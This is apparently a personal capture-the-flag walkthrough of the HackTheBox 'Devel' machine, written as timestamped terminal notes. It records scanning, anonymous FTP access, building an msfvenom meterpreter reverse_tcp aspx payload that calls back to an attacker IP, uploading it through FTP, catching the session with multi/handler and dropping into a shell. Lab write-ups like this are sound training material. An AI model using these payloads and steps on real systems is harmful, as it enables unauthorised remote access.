
```
Devel - Hackthebox.
IP: 10.10.10.5

lessons learned:
- webserver aspx reverse shell
- - multi/handler
```

```
2:05 PM 1/14/2023
nmap -sC -sV -oA nmap 10.10.10.5 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

```
2:06 PM 1/14/2023
ftp 10.10.10.5 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

```
2:10 PM 1/14/2023
ftp> get iisstart.htm																	
# this file was the only one I was able to get 
~~~~~~~~~~~~~~~~~~~~~~
local: iisstart.htm remote: iisstart.htm
229 Entering Extended Passive Mode (|||49174|)
125 Data connection already open; Transfer starting.
100% |************************************************************************|   689        2.91 KiB/s    00:00 ETA
226 Transfer complete.
689 bytes received in 00:00 (1.94 KiB/s)
ftp> 
```

```
2:12 PM 1/14/2023
going to http://10.10.10.5 only hosts a picture, going to dirsearch.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
```

```
2:13 PM 1/14/2023
dirsearch -u http://10.10.10.5:80 -x 400,401,403											
# access is denied when navigating to that website, ftp is the way forward, going to try to upload a file 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Target: http://10.10.10.5:80/

[19:13:12] Starting: 
[19:13:25] 500 -    3KB - /WebResource.axd?d=LER8t9aS
[19:13:35] 301 -  155B  - /aspnet_client  ->  http://10.10.10.5/aspnet_client/

Task Completed
```

```
2:15 PM 1/14/2023
ftp> put test.txt test.txt																	
# test.txt is on, going to upload reverse shell
~~~~~~~~~~~~~~~~~~~~~~~~~~
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||49176|)
125 Data connection already open; Transfer starting.
100% |************************************************************************|     6      154.19 KiB/s    --:-- ETA
226 Transfer complete.
6 bytes sent in 00:00 (0.01 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49177|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
01-15-23  02:17AM                    6 test.txt
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```

```
2:23 PM 1/14/2023 
Wrong way, gotta use msfvenom to generate payload.																	# generated payload through msf venom and put onto ftp machine, going to try to catch call back.
msfvenom -l payloads | grep "windows/meterpreter"
msfvenom ?
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.21 LPORT=4444 -f aspx > exploit.aspx                     # aspx because web server can run aspx
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ftp> put exploit.aspx exploit.aspx
local: exploit.aspx remote: exploit.aspx
229 Entering Extended Passive Mode (|||49185|)
125 Data connection already open; Transfer starting.
100% |**************************************************************|  2928       34.05 MiB/s    --:-- ETA
226 Transfer complete.
2928 bytes sent in 00:00 (10.00 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49186|)
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
01-15-23  02:48AM                 2928 exploit.aspx
03-17-17  04:37PM                  689 iisstart.htm
01-15-23  02:21AM                 5687 php-reverse-shell.php
01-15-23  02:17AM                    6 test.txt
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.

ftp> 
```

```
2:46 PM 1/14/2023
msfconsole																										# msfvenom and meterpreter setup.
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
set LHOST 
msf6 exploit(multi/handler) > set LHOST 10.10.16.21
LHOST => 10.10.16.21
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.10.16.21      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > 
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.16.21:4444 

																					#IN ORDER TO INITIATE REVERSE SHELL HAVE TO NAVIGATE TO THE LOCATION OF THE MSFVENOM PAYLOAD - http://10.10.10.5/exploit.aspx
```

```
2:55 PM 1/14/2023
msf6 exploit(multi/handler) > exploit

[*] Started reverse TCP handler on 10.10.16.21:4444 
[*] Sending stage (175686 bytes) to 10.10.10.5
[*] Meterpreter session 1 opened (10.10.16.21:4444 -> 10.10.10.5:49187) at 2023-01-14 19:53:13 -0500
```

```
2:55 PM 1/14/2023
meterpreter > pwd																	
#got a meterpreter session, going to enumerate.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~
c:\windows\system32\inetsrv

meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 2
Meterpreter     : x86/windows
meterpreter > getuid
Server username: IIS APPPOOL\Web
meterpreter > 
```

```
3:03 PM 1/14/2023													# DROPPING INTO A SHELL

meterpreter > shell
Process 3384 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>


